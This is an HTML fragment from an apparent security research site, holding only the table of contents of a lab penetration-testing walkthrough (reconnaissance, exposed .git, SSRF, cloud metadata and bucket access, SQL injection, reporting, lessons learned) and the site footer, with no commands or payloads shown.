class="table-of-contents__link toc-highlight">Lab environment:</a></li><li><a href="#essential-tools" class="table-of-contents__link toc-highlight">Essential Tools</a></li><li><a href="#setting-up-your-workspace" class="table-of-contents__link toc-highlight">Setting Up Your Workspace</a></li><li><a href="#configuring-burp-suite" class="table-of-contents__link toc-highlight">Configuring Burp Suite</a></li><li><a href="#phase-1-initial-reconnaissance--mapping-the-attack-surface" class="table-of-contents__link toc-highlight">Phase 1: Initial Reconnaissance — Mapping the Attack Surface</a><ul><li><a href="#port-scanning-finding-open-doors" class="table-of-contents__link toc-highlight">Port Scanning: Finding Open Doors</a></li><li><a href="#dns-and-infrastructure-analysis" class="table-of-contents__link toc-highlight">DNS and Infrastructure Analysis</a></li></ul></li><li><a href="#phase-2-web-application-enumeration--understanding-the-application" class="table-of-contents__link toc-highlight">Phase 2: Web Application Enumeration — Understanding the Application</a><ul><li><a href="#identifying-the-application" class="table-of-contents__link toc-highlight">Identifying the Application</a></li><li><a href="#confirming-the-application-type" class="table-of-contents__link toc-highlight">Confirming the Application Type</a></li></ul></li><li><a href="#phase-3-information-disclosure--the-critical-breakthrough" class="table-of-contents__link toc-highlight">Phase 3: Information Disclosure — The Critical Breakthrough</a><ul><li><a href="#checking-common-information-disclosure-points" class="table-of-contents__link toc-highlight">Checking Common Information Disclosure Points</a></li><li><a href="#exposed-git-repository" class="table-of-contents__link toc-highlight">Exposed .git Repository</a></li></ul></li><li><a href="#phase-4-cloud-service-testing--pivoting-to-a-weaker-target" class="table-of-contents__link toc-highlight">Phase 4: Cloud Service Testing — Pivoting to a Weaker Target</a><ul><li><a href="#testing-command-injection" class="table-of-contents__link toc-highlight">Testing Command Injection</a></li><li><a href="#testing-ssrf-server-side-request-forgery" class="table-of-contents__link toc-highlight">Testing SSRF (Server-Side Request Forgery)</a></li><li><a href="#exposing-environment-variables-and-secrets" class="table-of-contents__link toc-highlight">Exposing Environment Variables and Secrets</a></li></ul></li><li><a href="#phase-5-cloud-function-exploitation--gaining-cloud-access" class="table-of-contents__link toc-highlight">Phase 5: Cloud Function Exploitation — Gaining Cloud Access</a></li><li><a href="#accessing-gcp-metadata-service" class="table-of-contents__link toc-highlight">Accessing GCP Metadata Service</a></li><li><a href="#enumerating-cloud-resources" class="table-of-contents__link toc-highlight">Enumerating Cloud Resources</a></li><li><a href="#phase-6-storage-bucket-exploitation--the-treasure-trove" class="table-of-contents__link toc-highlight">Phase 6: Storage Bucket Exploitation — The Treasure Trove</a><ul><li><a href="#listing-bucket-contents" class="table-of-contents__link toc-highlight">Listing Bucket Contents</a></li><li><a href="#downloading-sensitive-files" class="table-of-contents__link toc-highlight">Downloading Sensitive Files</a></li><li><a href="#analyzing-the-source-code" class="table-of-contents__link toc-highlight">Analyzing the Source Code</a></li></ul></li><li><a href="#phase-7-advanced-web-application-testing" class="table-of-contents__link toc-highlight">Phase 7: Advanced Web Application Testing</a><ul><li><a href="#sql-injection-testing-with-sqlmap" class="table-of-contents__link toc-highlight">SQL Injection Testing with sqlmap</a></li><li><a href="#burp-suite-analysis" class="table-of-contents__link toc-highlight">Burp Suite Analysis</a></li></ul></li><li><a href="#phase-8-documentation-and-reporting" class="table-of-contents__link toc-highlight">Phase 8: Documentation and Reporting</a><ul><li><a href="#organizing-findings" class="table-of-contents__link toc-highlight">Organizing Findings</a></li><li><a href="#creating-proof-of-concept-scripts" class="table-of-contents__link toc-highlight">Creating Proof of Concept Scripts</a></li><li><a href="#generating-the-report" class="table-of-contents__link toc-highlight">Generating the Report</a></li></ul></li><li><a href="#key-lessons-and-takeaways" class="table-of-contents__link toc-highlight">Key Lessons and Takeaways</a><ul><li><a href="#1-information-disclosure-is-critical" class="table-of-contents__link toc-highlight">1. Information Disclosure is Critical</a></li><li><a href="#2-cloud-services-need-separate-security-postures" class="table-of-contents__link toc-highlight">2. Cloud Services Need Separate Security Postures</a></li><li><a href="#3-defense-in-depth-matters" class="table-of-contents__link toc-highlight">3. Defense in Depth Matters</a></li><li><a href="#4-source-code-exposure-amplifies-risk" class="table-of-contents__link toc-highlight">4. Source Code Exposure Amplifies Risk</a></li><li><a href="#5-methodical-testing-wins" class="table-of-contents__link toc-highlight">5. Methodical Testing Wins</a></li></ul></li><li><a href="#common-pitfalls-and-how-to-avoid-them" class="table-of-contents__link toc-highlight">Common Pitfalls and How to Avoid Them</a><ul><li><a href="#mistake-1-assuming-security-level-means-security" class="table-of-contents__link toc-highlight">Mistake 1: Assuming Security Level Means Security</a></li><li><a href="#mistake-2-ignoring-information-disclosure" class="table-of-contents__link toc-highlight">Mistake 2: Ignoring Information Disclosure</a></li><li><a href="#mistake-3-not-testing-cloud-services-separately" class="table-of-contents__link toc-highlight">Mistake 3: Not Testing Cloud Services Separately</a></li><li><a href="#mistake-4-poor-documentation" class="table-of-contents__link toc-highlight">Mistake 4: Poor Documentation</a></li></ul></li><li><a href="#learning-resources" class="table-of-contents__link toc-highlight">Learning Resources</a></li><li><a href="#conclusion-the-power-of-methodical-testing" class="table-of-contents__link toc-highlight">Conclusion: The Power of Methodical Testing</a></li><li><a href="#final-thoughts" class="table-of-contents__link toc-highlight">Final Thoughts</a></li></ul></div></div></div></div></main></div></div></div><footer class="site-footer" data-site-shell="standalone" data-site-shell-version="2026-07-24.1"><div class="shared-footer-inner"><a class="shared-footer-brand" href="/"><img src="/assets/ap-logo.png" alt="" width="32" height="32" loading="lazy" decoding="async"><span><strong>Andrey Pautov</strong><small>Security research</small></span></a><nav class="shared-footer-links" aria-label="Footer navigation"><a href="/cti.html">Research</a><a href="/guides.html">Library</a><a href="/projects.html">Products &amp; Labs</a><a href="/adversarygraph/">AdversaryGraph</a><a href="/about.html">About</a></nav><nav class="shared-footer-meta" aria-label="Site information"><a href="/privacy.html">Privacy / Data Handling</a><a href="/about.html#contact">Contact</a><a href="https://github.com/anpa1200" target="_blank" rel="noopener noreferrer">GitHub<span class="visually-hidden"> (opens in a new tab)</span><span aria-hidden="true"> ↗</span></a></nav></div><div class="shared-footer-bottom"><span>© <!-- -->2026<!-- --> Andrey Pautov · Original research and tooling</span><a href="#top" data-back-to-top="true">Back to top ↑</a></div></footer></div>
 </body>
 </html>
